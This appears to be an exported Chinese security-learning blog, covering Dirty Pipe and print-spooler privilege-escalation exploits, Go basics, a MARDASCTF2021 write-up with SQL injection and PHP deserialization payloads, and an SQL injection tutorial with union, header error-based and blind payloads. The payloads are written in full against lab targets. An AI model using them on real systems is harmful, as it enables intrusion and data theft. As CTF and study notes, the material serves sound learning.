<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="CVE-2022-0847-Linux-本地内核提权漏洞"><a href="#CVE-2022-0847-Linux-本地内核提权漏洞" class="headerlink" title="CVE-2022-0847 Linux 本地内核提权漏洞"></a>CVE-2022-0847 Linux 本地内核提权漏洞</h3><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>堪称新版脏牛。Dirty Pipe</p>
<p>允许非特权用户注入和覆盖任意只读文件中的数据，导致权限提升，并最终获得root权限。</p>
<p>exp 链接：<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p>
<h5 id="适用范围："><a href="#适用范围：" class="headerlink" title="适用范围："></a>适用范围：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux Kernel版本 &gt;&#x3D; 5.8</span><br><span class="line"></span><br><span class="line">Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102 </span><br></pre></td></tr></table></figure>



<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version    #查看linux内核版本</span><br><span class="line"></span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line"></span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220310212912716.png" alt="image-20220310212912716"></p>
<p>原理：<a href="https://mp.weixin.qq.com/s/cHuO8TO4IvGgslvipJGQ2A">漏洞通告：CVE-2022-0847linux内核提权漏洞复现/原理讲解 (qq.com)</a></p>
<p><a href="https://www.freebuf.com/company-information/324470.html">https://www.freebuf.com/company-information/324470.html</a></p>
<p><a href="https://zone.huoxian.cn/d/978-cve-2022-0847-dirtypipe-linux">CVE-2022-0847_DirtyPipe Linux 内核提权漏洞分析及复现 - 火线 Zone-云安全社区 (huoxian.cn)</a></p>
<h3 id="CVE-2020-1337"><a href="#CVE-2020-1337" class="headerlink" title="CVE-2020-1337"></a>CVE-2020-1337</h3><h3 id="CVE-2020–1030"><a href="#CVE-2020–1030" class="headerlink" title="CVE-2020–1030"></a>CVE-2020–1030</h3><h3 id="CVE-2020–1048"><a href="#CVE-2020–1048" class="headerlink" title="CVE-2020–1048"></a>CVE-2020–1048</h3><h3 id="CVE-2022-21999-打印机提权漏洞"><a href="#CVE-2022-21999-打印机提权漏洞" class="headerlink" title="CVE-2022-21999  打印机提权漏洞"></a>CVE-2022-21999  打印机提权漏洞</h3><p>参考：</p>
<p>原理：<a href="https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81">https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81</a></p>
<p>poc：<a href="https://github.com/ly4k/SpoolFool">https://github.com/ly4k/SpoolFool</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Access注入</title>
    <url>/2021/01/10/Access%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>常见数据库注入</category>
      </categories>
      <tags>
        <tag>Access注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Go</title>
    <url>/2022/03/21/Go/</url>
    <content><![CDATA[<p>Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。</p>
<h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>学习go写脚本和 免杀（其他大佬的有些免杀也是用go写的，效果不错，也算是为了能看懂代码吧）</p>
<p>go 没有类，有结构体，有指针，（主要是利用函数）。</p>
<span id="more"></span>

<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>go build</strong>生成二进制文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go build xxx.go</span><br></pre></td></tr></table></figure>

<p>结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">包声明   package</span><br><span class="line">引入包   import (&quot;&quot; &quot;&quot; &quot;&quot; &quot;xx&#x2F;xxx&quot;)</span><br><span class="line">函数     func function_name( [parameter list] ) [return_types] &#123;  函数体 &#125;</span><br><span class="line">变量     var xxx&#x3D;&quot;str&quot;  </span><br><span class="line">常量     const</span><br><span class="line">语句 &amp; 表达式  </span><br><span class="line">注释      </span><br></pre></td></tr></table></figure>

<!--more-->



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main  定义了包名</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  调用 fmt 包</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;菜鸟教程&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello go&quot;</span> + <span class="string">&quot;good&quot;</span>,<span class="string">&quot;good&quot;</span>)</span><br><span class="line"></span><br><span class="line">	test()</span><br><span class="line">	<span class="keyword">var</span> age <span class="keyword">int</span></span><br><span class="line">	age = <span class="number">11</span></span><br><span class="line">	fmt.Println(age)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="golang包"><a href="#golang包" class="headerlink" title="golang包"></a>golang包</h3><p>包用来区分命名空间，一般一个文件夹一个包，package “name” 声明包，文件夹与包名一样，一个文件夹下只有一个包。</p>
<ul>
<li>创建包</li>
</ul>
<p>例如src 文件夹下新建test文件 ，新建 test1.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">xxxx</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>导入包</li>
</ul>
<p>利用go module（1.11开始使用） 管理包依赖</p>
<ol>
<li>初始化模块</li>
</ol>
<p>go mod init  &lt;项目名称&gt;</p>
<ol start="2">
<li>依赖关系处理，通过go.mod文件</li>
</ol>
<p>go mod tidy</p>
<ol start="3">
<li>将依赖包复制到项目到 xxx目录</li>
</ol>
<p>go mod  xxx</p>
<p>如果包被屏蔽(墙),可以使用这个命令，随后使用go build -mod=xxxx编译</p>
<ol start="4">
<li>显示依赖关系</li>
</ol>
<p>go list -m all</p>
<p>go list -m -json all (详细显示)</p>
<ol start="5">
<li>下载依赖</li>
</ol>
<p>go  mod  download [path@version]</p>
<p>学习：<a href="https://www.runoob.com/go">https://www.runoob.com/go</a></p>
<p><a href="https://github.com/Leslie1sMe/golang">Leslie1sMe/golang: Golang的实战项目，学习笔记，代码例程汇总。 (github.com)</a></p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go学习</tag>
      </tags>
  </entry>
  <entry>
    <title>MARDASCTF2021</title>
    <url>/2021/05/02/MARDASCTF2021/</url>
    <content><![CDATA[<h2 id="BestDB-sql注入类型"><a href="#BestDB-sql注入类型" class="headerlink" title="BestDB -sql注入类型"></a>BestDB -sql注入类型</h2><p><img src="/2021/05/02/MARDASCTF2021/1.png" alt="1"></p>
<p>一看就感觉存在sql注入，重点是如何闭合，绕过。</p>
<span id="more"></span>

<p>F12 发现      <code>$sql = &quot;SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \&quot;$query\&quot;&quot;;</code></p>
<p>刚开始没有注意到 <code>OR username = \&quot;$query\&quot;&quot;;</code> giao ,一直在通过进行注入，但是都  Forbidden!!!了，过滤了单引号</p>
<p>然后尝试输入username尝试，当$query值为lisi时候我们进行闭合会有回显，而且只有个简单的空格过滤，/**/绕过即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lisi&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;1# 回显正常</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2# 报错</span><br><span class="line">说明存在注入。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lisi&quot;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3#  回显正常</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;4#  不回显。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查数据库名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(schema_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.schemata)2,3# </span><br><span class="line">可有可无这</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/02/MARDASCTF2021/2.png" alt="2"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查表名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),2,3#   </span><br><span class="line"></span><br><span class="line">过滤了单引号&#39;dataabse()&#39;就不能使用,</span><br><span class="line">正常在数据库查询，表名需带反引号，在php端中并不需要</span><br><span class="line"></span><br><span class="line">f1agdas,users两个表</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查字段名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;),2,3# </span><br><span class="line"></span><br><span class="line">&quot;f1agdas&quot;记得双引号</span><br><span class="line"></span><br><span class="line">id,f1agdas</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查数据</span><br><span class="line"></span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;f1agdas&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas),2,3#</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;load_file(0x2f666c61672e747874)),2,3#</span><br><span class="line"></span><br><span class="line">&#x2F;flag.txt进行十六进制或者CHAR()是为了绕过对&quot;&#x2F;&quot;过滤</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/02/MARDASCTF2021/3.png" alt="3"></p>
<h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>先贴上源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>

<p><a href="https://www.anquanke.com/post/id/167140#h2-5">https://www.anquanke.com/post/id/167140#h2-5</a></p>
<p>以前没有见过，这里存在动态拼接类，我们需要原生类进行去读文件。</p>
<p>一.可遍历目录类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DirectoryIteratorFilesystemIterator</span><br></pre></td></tr></table></figure>

<p><code>GlobIterator</code> 与上面略不同，该类可以通过模式匹配来寻找文件路径。</p>
<p>二.可读取文件类</p>
<p><code>SplFileObject</code> 在此函数中，URL 可作为文件名，不过也要受到<code>allow_url_fopen</code>影响</p>
<p>参考<a href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    public $class &#x3D; &#39;FilesystemIterator&#39;;    public $para &#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;;    public $check ;&#125;$pop&#x3D;new A();$pop&#x3D;serialize($pop);var_dump($pop);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/02/MARDASCTF2021/4.png" alt="4"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    public $class&#x3D;&#39;SplFileObject&#39;;    public $para&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&#x2F;flag.php&quot;;    public $check;    &#125;$o  &#x3D; new A();echo serialize($o);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/02/MARDASCTF2021/5.png" alt="5"></p>
<hr>
<p>利用原生类来反序列化，题目我第一次见，参考了网上的博客，</p>
<p>因为php原生类有很多的特定功能。</p>
<hr>
<p><a href="https://shimo.im/docs/V1hLlJ0RoRkI7Si9/">https://shimo.im/docs/V1hLlJ0RoRkI7Si9/</a>  各位大佬wp</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MARDASCTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle注入</title>
    <url>/2021/01/10/Oracle%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>常见数据库注入</category>
      </categories>
      <tags>
        <tag>Oracel注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2021/01/10/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>用户拥有可控参数，并且用户传入的参数被当作代码执行。</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" alt="sql注入流程图"></p>
 <span id="more"></span>

<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>UNION操作符可用于合并两个或多个SELECT语句的结果集，进行sql语句拼接。</p>
<p>1.先判断是否存在注入</p>
<p>2.判断参数类型</p>
<p>3.使用ORDER BY 查询列数，观察回显的位置</p>
<p>4.获取数据库名。</p>
<p>5.获取数据库中的表名。</p>
<p>6.获取数据库的表中的所有字段名</p>
<p>7.获取字段中的数据</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="数据库"></p>
<p>查询语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name <span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>  字段 <span class="keyword">from</span>  表 limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>或者使用group_concat()函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(字段名) <span class="keyword">from</span> 数据库名.表名</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>都是一样的，不同的是，</p>
<p>参数传递是POST类型，经常用burp suite进行测试</p>
<h4 id="手动测试和上面一样"><a href="#手动测试和上面一样" class="headerlink" title="手动测试和上面一样"></a>手动测试和上面一样</h4><p>经常出现在：登录框，搜索框。</p>
<h4 id="sqlmap测试"><a href="#sqlmap测试" class="headerlink" title="sqlmap测试:"></a>sqlmap测试:</h4><p> 1.sqlmap -r 1.txt，   sqlmap -r 1.txt –dbs等</p>
<p>2.sqlmap -u <a href="http://www.xxxxx.com/">http://www.xxxxx.com</a> –data “id=1” –dbs</p>
<p>其中1.txt为我们抓包获得的内容copy to file。</p>
<p>目的：如果页面有cookie和session,这样我们就不用单独添加这些值的内容了。</p>
<p>注：如果POST传入多个值，可以通过加<code>*</code>来对<code>*</code>前面的参数进行测试。</p>
<h2 id="HEADER注入-报错注入"><a href="#HEADER注入-报错注入" class="headerlink" title="HEADER注入+报错注入"></a>HEADER注入+报错注入</h2><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><ul>
<li>后台为了获取我们的信息，会导致header头（请求头）的部分参数可控，从而产生漏洞。</li>
</ul>
<h4 id="发生地方"><a href="#发生地方" class="headerlink" title="发生地方"></a>发生地方</h4><ul>
<li>http header注入通常发生用户请求头的XFF，User-Agent，referer等地方。主要是应为后台如果获取你的ip，用户信息（User-Agent）等就有可能出现header注入。 </li>
<li> 黑盒测试会比较困难，白盒测试我们可以通过查看代码查看。</li>
<li>因为利用insert into 插入页面，基本不会有回显，可以通过<code>盲注</code>或者<code>报错注入</code>进行构造sql语句。</li>
</ul>
<h4 id="php超全局变量："><a href="#php超全局变量：" class="headerlink" title="php超全局变量："></a>php超全局变量：</h4><p>$_REQUEST(获取GET/POST)</p>
<p>$_GET</p>
<p>$_POST</p>
<p>$_COOKIE</p>
<p>$_SERVER(包含请求头的大部分信息，路径，以及脚本位置等等信息的数组)  功能非常强大</p>
<p>$_SERVER[‘HTTP<code>_</code>HOST’]   可获取请求头里面的host内容</p>
<p>$_SERVER[“HTTP<code>_</code>USER<code>_</code>AGENT”]  获得UA</p>
<p>$_SERVER[“REMOTE<code>_</code>ADDR”]     获取用户ip</p>
<p><a href="https://zhuanlan.zhihu.com/p/147834873">参考文章</a></p>
<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p> updatexml() 是用来<code>更新</code>xml的一个函数，语法：updatexml(目标xml内容，xml路径，更新后内容)</p>
<p>updatexml(1,concat(0x7e,(select database())),1)</p>
<p>select database()为我们写入的子查询，concat可以将字符串进行拼接，0x7e为<code>~</code>的16进制，数据库支持16进制。</p>
<p>我们添加了错的xml路径，从而实现报错，将我们的</p>
<hr>
<p><a href="http://injectx1.lab.aqlab.cn:81/Pass-07/index.php?action=show_code">靶场</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username <span class="operator">=</span> $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password <span class="operator">=</span> $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$uagent <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$jc <span class="operator">=</span> $username.$password;</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> <span class="string">&#x27;select *from user where username =\&#x27;&#x27;.$username.&#x27;</span>\<span class="string">&#x27; and password=\&#x27;&#x27;.$password.&#x27;</span>\<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">if(preg_match(<span class="string">&#x27;/.*\&#x27;</span>.<span class="operator">*</span><span class="operator">/</span><span class="string">&#x27;,$jc)!== 0)&#123;die(&#x27;</span>为了网站安全性，禁止输入某些特定符号<span class="string">&#x27;);&#125;</span></span><br><span class="line"><span class="string">mysqli_select_db($conn,&#x27;</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="string">&#x27;);//不想告诉你库名</span></span><br><span class="line"><span class="string">$result = mysqli_query($conn,$sql);</span></span><br><span class="line"><span class="string">$row = mysqli_fetch_array($result);</span></span><br><span class="line"><span class="string">$uname = $row[&#x27;</span>username<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">$passwd = $row[&#x27;</span>password<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">if($row)&#123;</span></span><br><span class="line"><span class="string">$Insql = &quot;INSERT INTO uagent (`uagent`,`username`) VALUES (&#x27;</span>$uagent<span class="string">&#x27;,&#x27;</span>$uname<span class="string">&#x27;)&quot;;</span></span><br><span class="line"><span class="string">$result1 = mysqli_query($conn,$Insql);</span></span><br><span class="line"><span class="string">print_r(mysqli_error($conn));</span></span><br><span class="line"><span class="string">echo &#x27;</span>成功登录<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>我们查看源码发现有过滤，<code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code>发现服务器会获得我们UA里面的信息，并且<code>    $Insql = &quot;INSERT INTO uagent (</code>uagent<code>,</code>username<code>) VALUES (&#39;$uagent&#39;,&#39;$uname&#39;)&quot;;</code>存放数据库中。</p>
<p>User-Agent: 1’ or updatexml(1,concat(0x7e,(select database())),1) or ‘</p>
<p>或者使用User-Agent: 1’ or updatexml(1,concat(0x7e,(select database())),1)<code>,1)</code># </p>
<p>因为传入的是2个参数，我们也需要对后面的参数进行闭合。</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-41-35.png" alt="Snipaste_2021-02-05_23-41-35"></p>
<p>我们看到报错的PATH，下面就是把拼接的语句换成联合查询的语句就ok了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select database())),1),1)#                    爆出数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)#                                  爆出表名flag_head</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name =&#x27;</span>flag_head<span class="string">&#x27; limit 1,1)),1),1)#      爆出字段名flag_h1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag_h1 <span class="keyword">from</span> flag_head limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)#   获得flag</span><br></pre></td></tr></table></figure>



<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>该函数是对XML文档进行<code>查询</code>的函数，语法：extractvalue(目标文档路径，xml路径)</p>
<p>-1’ or (extractvalue(1,concat(0x7e,database(),0x7e))),1)<code>#</code></p>
<p>-1’ or (extractvalue(1,concat(0x7e,database(),0x7e))) or ‘</p>
<p>注意闭合。</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/Snipaste_2021-02-05_23-51-46.png" alt="Snipaste_2021-02-05_23-41-35"></p>
<p>我们同样发现报错的PATH，其余和上面同理</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>服务器对我们的输入错误并没有很明显的报错回显。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>布尔盲注：  页面只会显示true和false。</p>
<p>时间盲注 ： 如果页面无论输入什么页面都正常显示，但当我们加入例如 sleep(4),页面延迟4秒，页面即存在时间盲注。</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>length() 返回字符串长度</p>
<p>substr()截取字符串。substr(‘str’,位置,length)  stustr(‘qwer’,1,1)  返回q，stustr(‘qwer’,2,1)返回w。布尔盲注和使用。</p>
<p>ascii()返回ASCLL值</p>
<p>if( condition，true _result , false_result ) 例如：if(5=5,1,0)就会返回1，if(6=5,1,0)就会返回0。延时盲注会使用。</p>
<hr>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>and length(database())=11–+</p>
<p>and ascii(substr(database(),1,1))=111–+     #利用ascii值的方式进行盲注</p>
